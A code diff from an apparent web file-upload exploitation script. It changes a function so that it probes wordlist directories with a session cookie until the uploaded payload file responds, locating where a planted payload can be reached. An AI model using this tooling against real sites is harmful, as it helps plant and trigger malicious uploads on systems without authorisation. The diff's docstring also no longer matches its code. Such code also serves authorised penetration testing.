@@ -144,13 +144,16 @@ def try_upload_url(base_url, wordlist_file, cookie, payload_filename):
             return upload_url_candidate
     return None
 
-def get_upload_directory(base_url, wordlist_file):
+def get_upload_directory(base_url, wordlist_file, payload_filename, COOKIE):
     """
     Read candidate upload directories from a wordlist and return the first one.
     Lines starting with '#' are ignored.
     """
     with open(wordlist_file, "r") as f:
-        candidate_dirs = [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
+        candidate_dirs = [line.strip() for line in f if not line.strip().startswith("#")]
     for d in candidate_dirs:
-        print(f"[*] Candidate upload directory: {base_url + d}")
-    return base_url + candidate_dirs[0]
+        response = requests.get(base_url + d + payload_filename, cookies=COOKIE)
+        if response.status_code == 200:
+            print(f"[*] Directly Accessible Upload directory: {base_url + d + payload_filename}")
+            return base_url + d
+    return None
